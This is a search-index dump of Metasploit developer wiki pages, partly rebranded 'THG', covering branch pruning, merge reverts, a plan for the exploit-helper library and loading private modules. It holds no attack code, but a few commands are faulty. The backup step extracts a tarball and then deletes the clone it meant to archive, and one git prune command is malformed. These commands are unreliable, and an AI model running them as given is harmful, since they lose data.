branches Pretty much the same as above, but use --no-merged instead of --merged and allow for older unmerged branches (say, 2 months). Tell people about it. Sometimes, some people may run into sync problems with these missing branches and need to git remote prune origin themselves. Alternatively, they want to look into these branches again -- especially the unmerged ones. So, let people know that you just did this on the metasploit-hackers list and the Freenode IRC channel. If someone wants an old branch back, just go to your backup clone and push it back up as you would any branch: git checkout branchname && git push origin branchname . No problem.","title":"Remote Branch Pruning"},{"location":"dev/dark/Remote-Branch-Pruning/#back-up-the-repo","text":"Clone a new metasploit-framework.git repository: todb@presto:~/github/todb-r7$ git clone github_r7:rapid7/metasploit-framework.git msf-backup.git Go there and check out every remote branch we've got. That way, if you screw up and delete something important, you can add it back in later from this backup clone. todb@presto:~/github/todb-r7$ cd msf-backup.git `todb@presto:~/github/todb-r7/metasploit-framework$ for b in `git branch -r | grep -v \"HEAD -> origin\" | sed 's/^ origin\\///'`; do git checkout -b $b --track origin/$b; done Tarball it out of the way. todb@presto:~/github/todb-r7$ cd .. todb@presto:~/github$ tar zxvf msf-backup.git.tar.gz todb@presto:~/github$ rm -rf msf-backup.git","title":"Back up the repo"},{"location":"dev/dark/Remote-Branch-Pruning/#make-a-new-clone","text":"Now, clone metasploit again. I do this because I have like 20 remotes to deal with on my \"real\" clone and I don't want to have to grep through all my origin vs non-origin stuff. mazikeen:./rapid7$ git clone github_r7:rapid7/metasploit-framework.git msf-prune Now start figuring out what branches to delete. First, wipe out anything that responds to prune. Usually that's not a lot. mazikeen:./msf-prune$ git prune remote origin Next, take a look at what's already merged and what's not. We can drop most of the merged stuff right away. mazikeen:./msf-prune$ git branch -r --merged mazikeen:./msf-prune$ git branch -r --no-merged That gives a pretty good idea of how many branches we're talking about.","title":"Make a new clone"},{"location":"dev/dark/Remote-Branch-Pruning/#start-deleting-old-merged-branches","text":"Here's a one-liner, lightly modified from http://stackoverflow.com/questions/2514172/listing-each-branch-and-its-last-revisions-date-in-git#2514279 which lists all remote merged branches in date order. mazikeen:./msf-prune$ for k in `git branch -r --merged |grep -v \"HEAD ->\" | sed s/^..//`; do echo -e `git log -1 --pretty=format:\"%Cgreen%ci %Cblue%cr%Creset\" $k --`\\\\t\"$k\";done | sort Count off how many you want to keep at the end, do the arithmetic, and tack on another couple pipes to catch everything that's more than two weeks old. These are the merged branches that nobody's likely to miss. ` mazikeen:./msf-prune$ for k in `git branch -r --merged |grep -v \"HEAD ->\" | sed s/^..//`; do echo -e `git log -1 --pretty=format:\"%Cgreen%ci %Cblue%cr%Creset\" $k --`\\\\t\"$k\";done | sort | head -45 | sed \"s/^.*origin\\///\" > /tmp/merged_to_delete.txt Pull the trigger: mazikeen:./msf-prune$ for b in `cat /tmp/merged_to_delete.txt`; do echo Deleting $b && git push origin :$b; done Note that we still have our tarball, so if we need to reinstate any of these branches, just need to re-push.","title":"Start deleting old, merged branches"},{"location":"dev/dark/Remote-Branch-Pruning/#repeat-for-the-unmerged-branches","text":"Pretty much the same as above, but use --no-merged instead of --merged and allow for older unmerged branches (say, 2 months).","title":"Repeat for the unmerged branches"},{"location":"dev/dark/Remote-Branch-Pruning/#tell-people-about-it","text":"Sometimes, some people may run into sync problems with these missing branches and need to git remote prune origin themselves. Alternatively, they want to look into these branches again -- especially the unmerged ones. So, let people know that you just did this on the metasploit-hackers list and the Freenode IRC channel. If someone wants an old branch back, just go to your backup clone and push it back up as you would any branch: git checkout branchname && git push origin branchname . No problem.","title":"Tell people about it."},{"location":"dev/dark/Rex-Layout/","text":"Raptor Description Raptor's primary purpose will be to provide all the communication methods needed for Metasploit. This includes Socket level code as well as protocol implmenetations. Raptor should be as standalone as possible. Other Gems should dep Raptor not the other way around. Exploit Helper Tentative name for another new Gem. This Gem will focus on code that is designed to assist in the Exploitation process but is not key to communicating over services or implementing a specific protocol. Examples would be the ropbuilder, SEH libraries, egghunter, etc. Binary Manipulation Placeholder name for another Gem centered entirely around the Binary parsing and Manipulation. This includes all the different parsing libraries for the various executable formats. Meterpreter Client Tenative name for a Meterpreter client-side API. This code is currently rolled together with the rest of Rex. Meterpreter itself is already a seperate repo. The client should just be a gem. (This may be integrated into MsfCore instead of a seperate Gem. Investigate Further) Metasploit Core The core lbiraries of the Metasploit Framework. If the code has to do with running and maintaing the functions of the Framework rather than doing tasks inside a module, it probably belongs here. /dev/null see here These are things which are not needed anymore and should be killed with fire. wtf? These are the last few odd-men out. Currently unsure of where these things should move as we clear out Rex and dance around it's burnt out corpse. Final Home Directory/File Description Raptor io IO constructs such as streams and stream servers etc. Raptor mime Library for handling mime messages. Raptor proto Various Protocol libraries for communicating with different services Raptor services defines different tcp services. Currently only defines a local tcp relay Raptor socket Holds all the socket, comm, and siwtchboard classes for handling network communications Raptor sslscan Classes for SSLScan functionality. Allows discovery of SSL support on any tcp service Raptor service_manager Used to manage connection services such as HTTP Server Raptor text Text Generation and manipulation routines. Core to almsot every aspect of Metasploit. Exploit Helper arch Important Architecture information such as registers, opcodes, and stack manipulation routines. Exploit Helper encoder Encoder classes used by the encoder modules. (XDR moves to raptor though) Exploit Helper encoding Serve as base classes to some of the things in Encoder. Needs to be merged together with Encoder Exploit Helper exploitation Grab Bag of Exploitation helpers such as ropdb, opcodedb, egghunter, seh routines etc Exploit Helper nop Library for generating multi-byte NOP routines Exploit Helper payloads Contains Kernel mode wrapper for Windows payloads Exploit Helper poly Plymorphic code generation routines for polymorphic encoder modules Exploit Helper ropbuilder Library for building ROP chains Binary Manipulation assembly NASM bindings for use with msfpescan and msfbinscan Binary Manipulation elfparsey Parse and Maniuplate ELF executables Binary Manipulation elfscan Scanner for ELF executables Binary Manipulation imagesource Interfaces for reading executables from File or memory Binary Manipulation marchparsey Library for parsing and manipulating Mach-O executables Binary Manipulation machscan Scanner for Mach-O executables Binary Manipulation ole OLE Format creation, parsing and manipulations Binary Manipulation peparsey Parsing and Maniuplation library for PE format executables Binary Manipulation pescan Scanner for PE format executables Meterpreter Client post Meterepreter client-side API for talking to the Meterpreter agent Metasploit Core logging Classes for Metasploit logging Metasploit Core parser Import parser classes for various import formats Metasploit Core platforms Windows Registry Constants. Stick it with all the other registry mixins Metasploit Core sync Syncrhonization, thread locks etc. Metasploit Core ui UI code for the msfconsole interface etc. Metasploit Core compat Routines for checking the local paltform and handling compatability issues Metasploit Core constants A big collection of constants used by framework, probably needs to be split up Metasploit Core exceptions A big collection of exceptions, probably needs split up Metasploit Core job_container Job container for framework job management Metasploit Core thread_factory Thread factory for Framework thread management Metasploit Core transformer Some MetaProgramming magic rainbow unicorns. Used only in core, so move it there /dev/null encoders Deprecated Encoders. Unused. /dev/null script library for dealing with meterpreter scripts, which are no longer supported. /dev/null struct2 library for creating c-style binary structs. Replace with bitstruct ? registry Offline local registry parsing library. Not sure where this belongs ? zip Library for parsing, creating, and manipulating Zip files ? file Classes for dealing with extended fileutil options. Not sure where this belongs ? mac_oui MAC address vendor lookup class","title":"Rex Layout"},{"location":"dev/dark/Rex-Layout/#raptor-description","text":"Raptor's primary purpose will be to provide all the communication methods needed for Metasploit. This includes Socket level code as well as protocol implmenetations. Raptor should be as standalone as possible. Other Gems should dep Raptor not the other way around.","title":"Raptor Description"},{"location":"dev/dark/Rex-Layout/#exploit-helper","text":"Tentative name for another new Gem. This Gem will focus on code that is designed to assist in the Exploitation process but is not key to communicating over services or implementing a specific protocol. Examples would be the ropbuilder, SEH libraries, egghunter, etc.","title":"Exploit Helper"},{"location":"dev/dark/Rex-Layout/#binary-manipulation","text":"Placeholder name for another Gem centered entirely around the Binary parsing and Manipulation. This includes all the different parsing libraries for the various executable formats.","title":"Binary Manipulation"},{"location":"dev/dark/Rex-Layout/#meterpreter-client","text":"Tenative name for a Meterpreter client-side API. This code is currently rolled together with the rest of Rex. Meterpreter itself is already a seperate repo. The client should just be a gem. (This may be integrated into MsfCore instead of a seperate Gem. Investigate Further)","title":"Meterpreter Client"},{"location":"dev/dark/Rex-Layout/#metasploit-core","text":"The core lbiraries of the Metasploit Framework. If the code has to do with running and maintaing the functions of the Framework rather than doing tasks inside a module, it probably belongs here.","title":"Metasploit Core"},{"location":"dev/dark/Rex-Layout/#devnull","text":"see here These are things which are not needed anymore and should be killed with fire.","title":"/dev/null"},{"location":"dev/dark/Rex-Layout/#wtf","text":"These are the last few odd-men out. Currently unsure of where these things should move as we clear out Rex and dance around it's burnt out corpse. Final Home Directory/File Description Raptor io IO constructs such as streams and stream servers etc. Raptor mime Library for handling mime messages. Raptor proto Various Protocol libraries for communicating with different services Raptor services defines different tcp services. Currently only defines a local tcp relay Raptor socket Holds all the socket, comm, and siwtchboard classes for handling network communications Raptor sslscan Classes for SSLScan functionality. Allows discovery of SSL support on any tcp service Raptor service_manager Used to manage connection services such as HTTP Server Raptor text Text Generation and manipulation routines. Core to almsot every aspect of Metasploit. Exploit Helper arch Important Architecture information such as registers, opcodes, and stack manipulation routines. Exploit Helper encoder Encoder classes used by the encoder modules. (XDR moves to raptor though) Exploit Helper encoding Serve as base classes to some of the things in Encoder. Needs to be merged together with Encoder Exploit Helper exploitation Grab Bag of Exploitation helpers such as ropdb, opcodedb, egghunter, seh routines etc Exploit Helper nop Library for generating multi-byte NOP routines Exploit Helper payloads Contains Kernel mode wrapper for Windows payloads Exploit Helper poly Plymorphic code generation routines for polymorphic encoder modules Exploit Helper ropbuilder Library for building ROP chains Binary Manipulation assembly NASM bindings for use with msfpescan and msfbinscan Binary Manipulation elfparsey Parse and Maniuplate ELF executables Binary Manipulation elfscan Scanner for ELF executables Binary Manipulation imagesource Interfaces for reading executables from File or memory Binary Manipulation marchparsey Library for parsing and manipulating Mach-O executables Binary Manipulation machscan Scanner for Mach-O executables Binary Manipulation ole OLE Format creation, parsing and manipulations Binary Manipulation peparsey Parsing and Maniuplation library for PE format executables Binary Manipulation pescan Scanner for PE format executables Meterpreter Client post Meterepreter client-side API for talking to the Meterpreter agent Metasploit Core logging Classes for Metasploit logging Metasploit Core parser Import parser classes for various import formats Metasploit Core platforms Windows Registry Constants. Stick it with all the other registry mixins Metasploit Core sync Syncrhonization, thread locks etc. Metasploit Core ui UI code for the msfconsole interface etc. Metasploit Core compat Routines for checking the local paltform and handling compatability issues Metasploit Core constants A big collection of constants used by framework, probably needs to be split up Metasploit Core exceptions A big collection of exceptions, probably needs split up Metasploit Core job_container Job container for framework job management Metasploit Core thread_factory Thread factory for Framework thread management Metasploit Core transformer Some MetaProgramming magic rainbow unicorns. Used only in core, so move it there /dev/null encoders Deprecated Encoders. Unused. /dev/null script library for dealing with meterpreter scripts, which are no longer supported. /dev/null struct2 library for creating c-style binary structs. Replace with bitstruct ? registry Offline local registry parsing library. Not sure where this belongs ? zip Library for parsing, creating, and manipulating Zip files ? file Classes for dealing with extended fileutil options. Not sure where this belongs ? mac_oui MAC address vendor lookup class","title":"wtf?"},{"location":"dev/dark/Rolling-back-merges/","text":"Since the Metasploit-framework repository's master branch is the bleeding edge of development, occasionally mistakes happen. This page will attempt to give some guidance on how to roll back a bad merge. What's a bad merge? Anything that causes Travis-CI to fail rspec tests consistently. Anything that hits untested code that otherwise causes problems with msfconsole , msfcli , msfvenom , and other console commands. Sometimes, Travis-CI does choke up, due to network weather. Every build is a fresh clone, and all gems have to be reinstalled every time. Also, some rspec tests require network connections to assets on the Internet. Sometimes, Travis-CI itself is under a lot of load, and builds time out. The best way to diagnose these problems is simply to restart the build. Note, only Committers have rights to do this. If that doesn't clear things up, or if it's obvious that there are real failures (since you've read the rspec results and have read the tests), the first order of business is to undo your bad commit. Note : in branches other than master , you can usually just fix things normally with new commits. There are plenty of \"whoops\" commit messages in our history. A merge revert example Once, there was a bad merge on PR #2320 . The fellow landing this pull request ran into a merge conflict while landing, thought he fixed it, and pushed the results, which ended up breaking about a dozen Rspec tests. Whoops. That was a bad merge. PR #2624 fixed it. Here's the procedure used. Figure out what broke things. In this case, the failed build was pretty obvious: Build #5216 was red, and rerunning Travis-CI didn't solve. Reading the build log, we can see this was merge commit 3996557 . Check out the bad merge tip. These commands will put the local repo back to the bad merge, and create a local branch as such: git checkout 3996557 git checkout -b bad-merge You can inspect exactly what commits are contained in this merge with the following: git log bad-merge...bad-merge~ --oneline Like so: $ git log bad-merge...bad-merge~ --oneline 3996557 Fix conflcit lib/msf/util/exe.rb 6296c4f Merge pull request #9 from tabassassin/retab/pr/2320 d0a3ea6 Retab changes for PR #2320 bff7d0e Merge for retab 4c9e6a8 Default to exe-small The syntax is a little wacky, but this is saying, \"Show me all the commit hashes that occur from the bad-merge point to one back from bad-merge (iow, from right before bad-merge was merged). That's what the tilde (~) means. You could also use bad-merge^ or bad-merge^1 , they're all equivalent. You can see the diff with the following command. Note the reverse placement of the bad-merge and bad-merge~ commit points! git diff bad-merge~ bad-merge Take a look at that, confirm that yes, this is exactly what you want to revert, and then pull the trigger. Revert the merge git revert -m 1 bad-merge The -m 1 bit is important, because that specifies that you want the branch to return to the point from before the merge -- I have never had reason to revert a merge and throw out the other side of the merge, but I imagine it comes up often enough for other people to not have it be the default behavior. Note that this does /not/ reach into the repo and change history; for that, you would need to git push --force, and you never want to do that on the master branch . Instead, you are generating a new commit that reverses the contents of the merge commit. As usual, you will want to edit the commit message to be meaningful -- mention the affected commit hash and the affected pull request. You will also want to git commit -S --amend after this to sign the commit; git revert does not take a -S option. Bummer. Create a new PR. You will now create a new PR with your revert commit. That's simple enough. Again, be sure that the affected PRs are also informed; they may think their material landed, and while it technically did, it's no longer there; they will need to open new PRs and figure out how to resubmit their changes (hopefully, this time without causing merge conflicts). Bug the committers until your revert lands. Until your revert commit lands, master will remain broken, so dealing with this situation should be blocking basically anything else. Be vocal. That's it! If you have suggestions for fixes on this page, please bother @todb-r7 with them.","title":"Rolling back merges"},{"location":"dev/dark/Rolling-back-merges/#whats-a-bad-merge","text":"Anything that causes Travis-CI to fail rspec tests consistently. Anything that hits untested code that otherwise causes problems with msfconsole , msfcli , msfvenom , and other console commands. Sometimes, Travis-CI does choke up, due to network weather. Every build is a fresh clone, and all gems have to be reinstalled every time. Also, some rspec tests require network connections to assets on the Internet. Sometimes, Travis-CI itself is under a lot of load, and builds time out. The best way to diagnose these problems is simply to restart the build. Note, only Committers have rights to do this. If that doesn't clear things up, or if it's obvious that there are real failures (since you've read the rspec results and have read the tests), the first order of business is to undo your bad commit. Note : in branches other than master , you can usually just fix things normally with new commits. There are plenty of \"whoops\" commit messages in our history.","title":"What's a bad merge?"},{"location":"dev/dark/Rolling-back-merges/#a-merge-revert-example","text":"Once, there was a bad merge on PR #2320 . The fellow landing this pull request ran into a merge conflict while landing, thought he fixed it, and pushed the results, which ended up breaking about a dozen Rspec tests. Whoops. That was a bad merge. PR #2624 fixed it. Here's the procedure used.","title":"A merge revert example"},{"location":"dev/dark/Rolling-back-merges/#figure-out-what-broke-things","text":"In this case, the failed build was pretty obvious: Build #5216 was red, and rerunning Travis-CI didn't solve. Reading the build log, we can see this was merge commit 3996557 .","title":"Figure out what broke things."},{"location":"dev/dark/Rolling-back-merges/#check-out-the-bad-merge-tip","text":"These commands will put the local repo back to the bad merge, and create a local branch as such: git checkout 3996557 git checkout -b bad-merge You can inspect exactly what commits are contained in this merge with the following: git log bad-merge...bad-merge~ --oneline Like so: $ git log bad-merge...bad-merge~ --oneline 3996557 Fix conflcit lib/msf/util/exe.rb 6296c4f Merge pull request #9 from tabassassin/retab/pr/2320 d0a3ea6 Retab changes for PR #2320 bff7d0e Merge for retab 4c9e6a8 Default to exe-small The syntax is a little wacky, but this is saying, \"Show me all the commit hashes that occur from the bad-merge point to one back from bad-merge (iow, from right before bad-merge was merged). That's what the tilde (~) means. You could also use bad-merge^ or bad-merge^1 , they're all equivalent. You can see the diff with the following command. Note the reverse placement of the bad-merge and bad-merge~ commit points! git diff bad-merge~ bad-merge Take a look at that, confirm that yes, this is exactly what you want to revert, and then pull the trigger.","title":"Check out the bad merge tip."},{"location":"dev/dark/Rolling-back-merges/#revert-the-merge","text":"git revert -m 1 bad-merge The -m 1 bit is important, because that specifies that you want the branch to return to the point from before the merge -- I have never had reason to revert a merge and throw out the other side of the merge, but I imagine it comes up often enough for other people to not have it be the default behavior. Note that this does /not/ reach into the repo and change history; for that, you would need to git push --force, and you never want to do that on the master branch . Instead, you are generating a new commit that reverses the contents of the merge commit. As usual, you will want to edit the commit message to be meaningful -- mention the affected commit hash and the affected pull request. You will also want to git commit -S --amend after this to sign the commit; git revert does not take a -S option. Bummer.","title":"Revert the merge"},{"location":"dev/dark/Rolling-back-merges/#create-a-new-pr","text":"You will now create a new PR with your revert commit. That's simple enough. Again, be sure that the affected PRs are also informed; they may think their material landed, and while it technically did, it's no longer there; they will need to open new PRs and figure out how to resubmit their changes (hopefully, this time without causing merge conflicts).","title":"Create a new PR."},{"location":"dev/dark/Rolling-back-merges/#bug-the-committers-until-your-revert-lands","text":"Until your revert commit lands, master will remain broken, so dealing with this situation should be blocking basically anything else. Be vocal.","title":"Bug the committers until your revert lands."},{"location":"dev/dark/Rolling-back-merges/#thats-it","text":"If you have suggestions for fixes on this page, please bother @todb-r7 with them.","title":"That's it!"},{"location":"dev/dark/Running-Private-Modules/","text":"If you're in the business of writing or collecting Metasploit modules that aren't part of the standard distribution, then you need a convenient way to load those modules in Metasploit. Never fear, it's pretty easy, using Metasploit's default local module search path, $HOME/.msf4/modules , and there are just a couple caveats: Mirror the \"real\" Metasploit module paths You must first set up a directory structure that fits with Metasploit's expectations of path names. What this typically means is that you should first create an \"exploits\" directory structure, like so: mkdir -p $HOME /.msf4/modules/exploits If you are using auxiliary or post modules, or are writing payloads you'll want to mkdir those as well. Create an appropriate category Modules are sorted by (somewhat arbitrary) categories. These can be anything you like; I usually use test or private , but if you are developing a module with an eye toward providing it to the main Metasploit distribution, you will want to mirror the real module path. For example: mkdir -p $HOME /.msf4/modules/exploits/windows/fileformat ... if you are developing a file format exploit for Windows. Create the module Once you have a directory to place it in, feel free to download or start writing your module. Test it all out If you already have msfconsole running, use a reload_all command to pick up your new modules. If not, just start msfconsole and they'll be picked up automatically. If you'd like to test with something generic, I have a module posted up as a gist, here: https://gist.github.com/todb-r7/5935519 , so let's give it a shot: mkdir -p $HOME /.msf4/modules/exploits/test curl -Lo ~/.msf4/modules/exploits/test/test_module.rb https://gist.github.com/todb-r7/5935519/raw/17f7e40ab9054051c1f7e0655c6f8c8a1787d4f5/test_module.rb todb@ubuntu:~$ mkdir -p $HOME /.msf4/modules/exploits/test todb@ubuntu:~$ curl -Lo ~/.msf4/modules/exploits/test/test_module.rb https://gist.github.com/todb-r7/5935519/raw/6e5d2da61c82b0aa8cec36825363118e9dd5f86b/test_module.rb % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1140 0 1140 0 0 3607 0 --:--:-- --:--:-- --:--:-- 7808 Then, in my msfconsole window: msf > reload_all [*] Reloading modules from all module paths... IIIIII dTb.dTb _.---._ II 4' v 'B .'\"\".'/|\\`.\"\"'. II 6. .P : .' / | \\ `. : II 'T;. .;P' '.' / | \\ `.' II 'T; ;P' `. / | \\ .' IIIIII 'YvP' `-.__|__.-' I love shells --egypt =[ metasploit v4.6.2-2013052901 [core:4.6 api:1.0] + -- --=[ 1122 exploits - 707 auxiliary - 192 post + -- --=[ 307 payloads - 30 encoders - 8 nops msf > use exploit/test/test_module msf exploit(test_module) > info Name: Fake Test Module Module: exploit/test/test_module Version: 0 Platform: Windows Privileged: No License: Metasploit Framework License (BSD) Rank: Excellent Provided by: todb <todb@metasploit.com> Available targets: Id Name -- ---- 0 Universal Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- DATA Hello, world! yes The output data Payload information: Description: If this module loads, you know you're doing it right. References: http://cvedetails.com/cve/1970-0001/ msf exploit(test_module) > exploit [*] Started reverse handler on 192.168.145.1:4444 [+] Hello, world! msf exploit(test_module) > Troubleshooting That's really all there is to it. The most common problems that people (including myself) run into are: Attempting to create a module in $HOME/.msf4/modules/ . This won't work because you need to specify if it's an exploit or a payload or something. Check ls /opt/metasploit/apps/pro/msf3/modules/ (or where your install of Metasploit lives). Attempting to create a module in $HOME/.msf4/modules/auxiliary/ . This won't work because you need at least one level of categorization. It can be new, like auxiliary/0day/ , or existing, like auxiliary/scanner/scada/ . Attempting to create a module in $HOME/.msf4/exploit/ or $HOME/.msf4/posts/ . Note the pluralization of the directory names; they're different for different things. Exploits, payloads, encoders, and nops are plural, while auxiliary and post are singular. Metasploit Community and Pro editions Note that the $HOME directory for Metasploit Community Edition is going to be root and not your own user directory, so if you are expecting modules to show up in the Metasploit CE (or Express, or Pro) web UIs, you will want to stash your external modules in /root/.msf4/modules . Of course, this means you need root access to the machine in question, but hey, you're a l33t Metasploit user, so that shouldn't be too hard. Also note that if your modules are not displaying in the web UI, you should restart Pro service. Windows For Windows users, the above is all true, except for accessing the modules from the web GUI. Sadly, you're a little out of luck; the module load paths on Windows are a little more restrictive and don't allow for external modules. However, the Console2-based Metasploit Console (Start > Programs > Metasploit > Metasploit Console) will work out just fine. New mixins and protocols Any module that requires on changes to core library functions, such as new protocol parsers or other library mixins, aren't going to work out for you this way -- you're going to end up spewing errors all over the place as your module tries to load these classes. It's possible to write modules as completely self-contained in nearly all cases (thanks to Ruby's open class architecture), but such modules nearly always get refactored later to make the protocol and other mixin bits available to other modules. In this case, it would be better to work with modules like that using a proper GitHub checkout with a development branch -- see the dev environment setup docs for tons more on that. A final warning If you are loading new and exciting Metasploit modules, know that these things will tend to have access to anything you have access to; doubly so if you're dropping them in root. Metasploit modules are plain text Ruby, so you can read them -- but please be careful, and only add external modules from trusted sources; don't just go grabbing any old thing you see on the Internet, because you may find yourself backdoored (or worse) in short order.","title":"Running Private Modules"},{"location":"dev/dark/Running-Private-Modules/#mirror-the-real-metasploit-module-paths","text":"You must first set up a directory structure that fits with Metasploit's expectations of path names. What this typically means is that you should first create an \"exploits\" directory structure, like so: mkdir -p $HOME /.msf4/modules/exploits If you are using auxiliary or post modules, or are writing payloads you'll want to mkdir those as well.","title":"Mirror the \"real\" Metasploit module paths"},{"location":"dev/dark/Running-Private-Modules/#create-an-appropriate-category","text":"Modules are sorted by (somewhat arbitrary) categories. These can be anything you like; I usually use test or private , but if you are developing a module with an eye toward providing it to the main Metasploit distribution, you will want to mirror the real module path. For example: mkdir -p $HOME /.msf4/modules/exploits/windows/fileformat ... if you are developing a file format exploit for Windows.","title":"Create an appropriate category"},{"location":"dev/dark/Running-Private-Modules/#create-the-module","text":"Once you have a directory to place it in, feel free to download or start writing your module.","title":"Create the module"},{"location":"dev/dark/Running-Private-Modules/#test-it-all-out","text":"If you already have msfconsole running, use a reload_all command to pick up your new modules. If not, just start msfconsole and they'll be picked up automatically. If you'd like to test with something generic, I have a module posted up as a gist, here: https://gist.github.com/todb-r7/5935519 , so let's give it a shot: mkdir -p $HOME /.msf4/modules/exploits/test curl -Lo ~/.msf4/modules/exploits/test/test_module.rb https://gist.github.com/todb-r7/5935519/raw/17f7e40ab9054051c1f7e0655c6f8c8a1787d4f5/test_module.rb todb@ubuntu:~$ mkdir -p $HOME /.msf4/modules/exploits/test todb@ubuntu:~$ curl -Lo ~/.msf4/modules/exploits/test/test_module.rb https://gist.github.com/todb-r7/5935519/raw/6e5d2da61c82b0aa8cec36825363118e9dd5f86b/test_module.rb % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1140 0 1140 0 0 3607 0 --:--:-- --:--:-- --:--:-- 7808 Then, in my msfconsole window: msf > reload_all [*] Reloading modules from all module paths... IIIIII dTb.dTb _.---._ II 4' v 'B .'\"\".'/|\\`.\"\"'. II 6. .P : .' / | \\ `. : II 'T;. .;P' '.' / | \\ `.' II 'T; ;P' `. / | \\ .' IIIIII 'YvP' `-.__|__.-' I love shells --egypt =[ metasploit v4.6.2-2013052901 [core:4.6 api:1.0] + -- --=[ 1122 exploits - 707 auxiliary - 192 post + -- --=[ 307 payloads - 30 encoders - 8 nops msf > use exploit/test/test_module msf exploit(test_module) > info Name: Fake Test Module Module: exploit/test/test_module Version: 0 Platform: Windows Privileged: No License: Metasploit Framework License (BSD) Rank: Excellent Provided by: todb <todb@metasploit.com> Available targets: Id Name -- ---- 0 Universal Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- DATA Hello, world! yes The output data Payload information: Description: If this module loads, you know you're doing it right. References: http://cvedetails.com/cve/1970-0001/ msf exploit(test_module) > exploit [*] Started reverse handler on 192.168.145.1:4444 [+] Hello, world! msf exploit(test_module) >","title":"Test it all out"},{"location":"dev/dark/Running-Private-Modules/#troubleshooting","text":"That's really all there is to it. The most common problems that people (including myself) run into are: Attempting to create a module in $HOME/.msf4/modules/ . This won't work because you need to specify if it's an exploit or a payload or something. Check ls /opt/metasploit/apps/pro/msf3/modules/ (or where your install of Metasploit lives). Attempting to create a module in $HOME/.msf4/modules/auxiliary/ . This won't work because you need at least one level of categorization. It can be new, like auxiliary/0day/ , or existing, like auxiliary/scanner/scada/ . Attempting to create a module in $HOME/.msf4/exploit/ or $HOME/.msf4/posts/ . Note the pluralization of the directory names; they're different for different things. Exploits, payloads, encoders, and nops are plural, while auxiliary and post are singular.","title":"Troubleshooting"},{"location":"dev/dark/Running-Private-Modules/#metasploit-community-and-pro-editions","text":"Note that the $HOME directory for Metasploit Community Edition is going to be root and not your own user directory, so if you are expecting modules to show up in the Metasploit CE (or Express, or Pro) web UIs, you will want to stash your external modules in /root/.msf4/modules . Of course, this means you need root access to the machine in question, but hey, you're a l33t Metasploit user, so that shouldn't be too hard. Also note that if your modules are not displaying in the web UI, you should restart Pro service.","title":"Metasploit Community and Pro editions"},{"location":"dev/dark/Running-Private-Modules/#windows","text":"For Windows users, the above is all true, except for accessing the modules from the web GUI. Sadly, you're a little out of luck; the module load paths on Windows are a little more restrictive and don't allow for external modules. However, the Console2-based Metasploit Console (Start > Programs > Metasploit > Metasploit Console) will work out just fine.","title":"Windows"},{"location":"dev/dark/Running-Private-Modules/#new-mixins-and-protocols","text":"Any module that requires on changes to core library functions, such as new protocol parsers or other library mixins, aren't going to work out for you this way -- you're going to end up spewing errors all over the place as your module tries to load these classes. It's possible to write modules as completely self-contained in nearly all cases (thanks to Ruby's open class architecture), but such modules nearly always get refactored later to make the protocol and other mixin bits available to other modules. In this case, it would be better to work with modules like that using a proper GitHub checkout with a development branch -- see the dev environment setup docs for tons more on that.","title":"New mixins and protocols"},{"location":"dev/dark/Running-Private-Modules/#a-final-warning","text":"If you are loading new and exciting Metasploit modules, know that these things will tend to have access to anything you have access to; doubly so if you're dropping them in root. Metasploit modules are plain text Ruby, so you can read them -- but please be careful, and only add external modules from trusted sources; don't just go grabbing any old thing you see on the Internet, because you may find yourself backdoored (or worse) in short order.","title":"A final warning"},{"location":"dev/dark/Setting-Up-a-thg-Development-Environment/","text":"The shortlink to this wiki page is https://darkcode0x00/THG_DEV_main This is a guide for setting up a developer environment to contribute modules, documentation, and fixes to the THG Framework. If you just want to use THG for legal, authorized hacking, we recommend instead you: Install the open-source Omnibus installer , or Use the pre-installed THG on Kali Linux or Parrot Linux . If you want to contribute to THG, start by reading our CONTRIBUTING.md , then follow the rest of this guide. Assumptions You have installed an apt-based Linux environment, such as Ubuntu or Kali . You have created a GitHub account and associated an ssh key with it. You have familiarity with Git and Github, or have completed the Github bootcamp . For optional database and REST API functionality, you will need regular user account that is not root . Install dependencies Open a terminal on your Linux host and set up Git, build tools, and Ruby dependencies: sudo apt update && sudo apt install -y git autoconf build-essential libpcap-dev libpq-dev zlib1g-dev libsqlite3-dev Set up your local copy of the repository You will need to use Github to create a fork for your contributions and receive the latest updates from our repository. Login to Github and click the \"Fork\" button in the top-right corner of the THG-framework repository. Create a git directory in your home folder and clone your fork to your local machine: export GITHUB_USERNAME = YOUR_USERNAME_FOR_GITHUB export GITHUB_EMAIL = YOUR_EMAIL_ADDRESS_FOR_GITHUB mkdir -p ~/git cd ~/git git clone git@github.com: $GITHUB_USERNAME /THG-framework cd ~/git/THG-framework If you encounter a \"permission denied\" error on the above command, research the error message. If there isn't an explicit reason given, confirm that your Github SSH key is configured correctly . To receive updates, you will create an upstream-master branch to track the Rapid7 remote repository, alongside your master branch which will point to your personal repository's fork: git remote add upstream git@github.com:rapid7/THG-framework.git git fetch upstream git checkout -b upstream-master --track upstream/master Configure your Github username, email address, and username. Ensure your user.email matches the email address you registered with your Github account. git config --global user.name \" $GITHUB_USERNAME \" git config --global user.email \" $GITHUB_EMAIL \" git config --global github.user \" $GITHUB_USERNAME \" Set up THGtidy to run before each git commit and after each git merge to quickly identify potential issues with your contributions: cd ~/git/THG-framework ln -sf ../../tools/dev/pre-commit-hook.rb .git/hooks/pre-commit ln -sf ../../tools/dev/pre-commit-hook.rb .git/hooks/post-merge Install Ruby Linux distributions do not ship with the latest Ruby, nor are package managers routinely updated. Additionally, if you are working with multiple Ruby projects, each one has dependencies and Ruby versions which can start to conflict. For these reasons, it is advisable to use a Ruby manager. You could just install Ruby directly (eg. sudo apt install ruby-dev ), but you may likely end up with the incorrect version and no way to update. Instead, consider using one of the many different Ruby environment managers available. The THG team prefers rbenv and rvm . Regardless of your choice, you'll want to make sure that, when inside the ~/git/THG-framework directory, you are running the correct version of Ruby: $ cd ~/git/THG-framework $ cat .ruby-version 2.5.3 $ ruby -v ruby 2.5.3p105 (2018-10-18 revision 65156) [x86_64-linux-gnu] Note: the Ruby version is likely to change over time, so don't rely on the output in the above example. Instead, confirm your ruby -v output with the version number listed in the .ruby-version file. If the two versions don't match, restart your terminal. If that does not work, consult the troubleshooting documentation for your Ruby environment manager. Unfortunately, troubleshooting the Ruby environment is beyond the scope of this document, but feel free to reach out for community support using the links at the bottom of this document. Install Gems Before you run THG, you will need to update the gems (Ruby libraries) that THG depends on: cd ~/git/THG-framework/ gem 